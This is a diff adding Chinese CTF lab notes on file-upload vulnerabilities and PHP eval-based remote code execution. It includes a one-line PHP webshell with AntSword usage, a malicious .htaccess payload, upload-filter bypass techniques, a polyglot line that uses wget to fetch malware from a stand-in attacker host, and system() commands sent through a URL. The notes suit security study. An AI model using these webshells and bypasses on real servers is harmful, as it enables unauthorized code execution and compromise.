@@ -705,3 +705,223 @@ Content-Security-Policy:
 可以看到题目把script这个关键词给ban了，所以需要其他办法，可以通过大小写、双写绕过`scrscriptipt`
 
 ![image-20250306212450542](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250306212450542.png)
+
+### 7. 文件上传
+
+一句话木马贯穿整个文件上传的始终，那么先来学习一句话木马
+
+`<?php@eval($_POST['123456']);?>`或者`<?php@assert($_POST['123456']);?>`
+
+- **`@`**：错误控制运算符，用于抑制代码执行过程中可能产生的错误信息，使攻击者更难发现异常。
+
+- **`eval()`**：PHP 函数，将传入的字符串**作为 PHP 代码直接执行**（高危操作）。
+
+- **`$_POST['123456']`**：从 HTTP POST 请求中获取参数名为 `123456` 的值。
+
+  123456相当于通信与服务端约定的“密钥”，用于标识通信参数。蚁剑在连接配置中填写该参数名（即“密码”），确保所有指令均通过此参数传递，实现**身份验证**，例如`123456=eval(base64_decode('c3lzdGVtKCJ3aG9hbWkiKTs='));  // 解码后为 system("whoami");`
+
+蚁剑通过向该 WebShell 发送 **POST 请求**，将需要执行的命令（如文件操作、系统命令等）编码后注入到参数 `123456` 中。服务器执行后返回结果，蚁剑解析并展示给用户
+
+#### 无验证
+
+直接构造一句话木马：`<?php@eval($_POST['123456']);?>`，然后上传，接着用蚁剑链接就好了
+
+![image-20250307145755831](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307145755831.png)
+
+#### 前端验证
+
+既然题目说是前端验证，那么就来看看源码写了啥，可以看到对于提交进行了验证，只支持三种文件格式，那么我们可以改掉.php的后缀名
+
+![image-20250307150238239](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307150238239.png)
+
+用burp抓包，然后修改请求包的内容，把.php.jpg改成.jpg就好了
+
+![image-20250307151030513](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307151030513.png)
+
+![image-20250307151103052](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307151103052.png)
+
+接着用中国蚁剑连上去就能找到flag。那么除了这种办法，我们能不能直接修改前端js代码，从而实现绕过呢，答案是不行，我就在纠结为什么呢。之前打过一些靶场，可以通过修改`max-length`，从而实现提交框长度无限制输入，但是为什么这里就不行呢。问了大佬才知道，其实浏览器有一个js寄存器，在服务器把HTML代码发送过来后，已经进行了渲染，然后把js代码寄存到 浏览器，短时间内不会改变，所以修改前端js代码属于掩耳盗铃，不成气候。
+
+那么有没有可能修改服务器返回的response请求呢，从而直接在页面答案是可以的，我们一直认为burp只能抓请求包，其实它还可以抓响应包，从而修改前端渲染。
+
+![image-20250307152113938](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307152113938.png)
+
+![image-20250307152147442](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307152147442.png)
+
+![image-20250307152317552](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307152317552.png)
+
+#### .htaccess
+
+**适用场景**：Apache服务器环境下的文件上传漏洞利用，攻击者通过上传恶意 `.htaccess` 文件篡改服务器配置，绕过安全限制或执行任意代码。
+
+**攻击原理与核心逻辑**
+
+1. `.htaccess` 文件的作用
+   - 用于Apache服务器的目录级配置，可覆盖全局设置（如文件解析规则、重定向、权限控制）。
+   - 攻击者通过上传恶意 `.htaccess` 文件，修改服务器对特定文件类型的处理方式（例如将图片解析为PHP）。
+2. 攻击链关键点
+   - **文件上传漏洞**：允许上传任意文件（包括 `.htaccess`）。
+   - **服务器配置缺陷**：未禁用 `.htaccess` 覆盖权限或未过滤上传文件内容。
+
+恶意.htaccess文件payload
+
+```apache
+\# 将.jpg文件解析为PHP   
+AddType application/x-httpd-php .jpg   
+# 或强制所有文件由PHP解析   
+SetHandler application/x-httpd-php
+```
+
+刷题
+
+```html
+<!--
+if (!empty($_POST['submit'])) {
+    $name = basename($_FILES['file']['name']);
+    $ext = pathinfo($name)['extension'];
+    $blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf");
+    if (!in_array($ext, $blacklist)) {
+        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {
+            echo "<script>alert('上传成功')</script>";
+            echo "上传文件相对路径<br>" . UPLOAD_URL_PATH . $name;
+        } else {
+            echo "<script>alert('上传失败')</script>";
+        }
+    } else {
+        echo "<script>alert('文件类型不匹配')</script>";
+    }
+}
+-->
+```
+
+后端已经把会出现这些恶意代码的过滤了，所以可以用.htaccess这种配置文件，我在解题的过程中遇到了一个问题，就是难道我不用运行这个配置文件吗？其实只要我们运行了.jpg文件，因为在相同目录下，所以会直接转成.php。
+
+#### MIME绕过
+
+MIME（Multipurpose Internet Mail Extensions）类型用于标识文件的格式，服务器通过校验 MIME 类型来限制用户上传文件的种类（如仅允许 `image/jpeg`）。攻击者通过 **伪造或篡改 MIME 类型**，使恶意文件绕过校验逻辑，具体原理如下：
+
+1. 客户端与服务器校验不一致
+   - **客户端校验**：前端通过 JavaScript 或 HTML5 的 `accept` 属性限制文件类型，但可被绕过（如禁用浏览器脚本）。
+   - **服务器校验**：仅依赖 HTTP 请求头中的 `Content-Type` 字段（如 `image/png`），未检测文件真实内容。
+2. 文件内容与类型不匹配
+   - 攻击者将 PHP、JS 等可执行代码的扩展名改为 `.jpg`，并伪造 `Content-Type` 为 `image/jpeg`，使服务器误判文件安全性。
+3. 解析逻辑漏洞
+   - 服务器对多部分表单数据（Multipart/Form-Data）解析错误，导致 MIME 类型提取失效。
+
+刷题！有多重办法
+
+1.双扩展名混淆：直接在bp修改后缀名
+
+![image-20250307161837992](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307161837992.png)
+
+![image-20250307161854784](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307161854784.png)
+
+2.**直接篡改 MIME 类型**：直接修改Content-type的类型为：image/jpeg
+
+![image-20250307162227629](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307162227629.png)
+
+3.失败的方法
+
+- **多部分表单数据注入**没办法，也就是多加一个Content-type来让解析错误；
+
+- 文件头伪造也不行，
+
+  ```php
+  GIF89a  
+  <?php system("wget http://attacker.com/malware");  ?>  
+  ```
+
+#### 文件头检查
+
+看到一个大佬直接用PIL生成一个图片，也是挺骚的哈哈哈
+
+```python
+from PIL import Image
+
+img = Image.new("RGB", (1,1), "red")
+with open ("red.png", "wb") as f:
+    img.save(f)
+```
+
+![image-20250307210729161](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307210729161.png)
+
+![image-20250307210949087](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307210949087.png)
+
+#### 00截断
+
+文件上传的 **00截断攻击**（也称为空字节截断攻击）是一种利用空字符（`%00`，ASCII码为`0x00`）绕过服务器文件上传校验的攻击方式。其核心原理是**利用编程语言或系统对字符串处理的特性，截断文件名中的后续内容**，从而绕过文件扩展名检查。
+
+#### **攻击原理**
+
+1. **空字符的特性**
+
+- 空字符（`%00`）在C语言、PHP等编程语言中表示字符串的**终止符**。例如：
+
+  ```
+  // PHP中，以下代码会输出 "evil"（遇到%00后停止解析）
+  $filename = "evil.php%00.jpg";
+  echo basename($filename); // 输出 "evil.php"
+  ```
+
+2. **攻击场景**
+
+- 假设服务器对上传文件的扩展名进行检查，要求必须是 `.jpg`，但保存文件时直接使用原始文件名：
+
+  ```
+  // 伪代码示例（存在漏洞）
+  $filename = $_FILES['file']['name'];
+  if (check_extension($filename) == 'jpg') {
+      move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/$filename");
+  }
+  ```
+
+- 攻击者提交文件名：`evil.php%00.jpg`。
+
+  - 检查阶段：服务器认为扩展名是 `.jpg`（校验通过）。
+  - 保存阶段：由于空字符截断，实际保存为 `/uploads/evil.php`。
+
+3. **攻击成功条件**
+
+- 服务器未对文件名中的空字符进行过滤。
+- 文件路径或文件名直接拼接用户输入（未做安全处理）。
+- 服务器环境支持空字符截断（如旧版本PHP、C语言实现的文件处理逻辑）。
+
+4. 防御方法
+   - **严格过滤空字符**；
+   - **保存时重命名文件**；
+
+#### 双写绕过
+
+主要是php代码用了替换操作：`$name = str_ireplace($blacklist, "", $name);`
+
+```php
+<?php
+echo str_ireplace("abc", "", "aabcbc");
+?>
+```
+
+![image-20250307220011135](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307220011135.png)
+
+所以就只将abc替换成了‘‘’’,那这样子就只需要双写就能绕过
+
+### 8.RCE
+
+#### eval执行
+
+eval函数就是将参数转化成php代码运行，那么其实这个就是一句话木马，意思就是cmd是参数名，我们可以将命令输入到cmd中，就可以在服务器中找到flag
+
+![](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307115501962.png)
+
+有两种办法，第一：中国蚁剑，直接连接
+
+![image-20250307115646709](C:/Users/Beamice/AppData/Roaming/Typora/typora-user-images/image-20250307115646709.png)
+
+另外一种办法，自己写命令，然后通过url传过去，需要利用`system`函数来调用linux系统命令
+
+`http://challenge-23d64140b557efc9.sandbox.ctfhub.com:10800/?cmd=system(%22ls%20/%22);`
+
+![image-20250307115803389](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307115803389.png)
+
+`http://challenge-23d64140b557efc9.sandbox.ctfhub.com:10800/?cmd=system(%22cat%20/flag_6547%22);`
+
+![image-20250307115929504](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250307115929504.png)
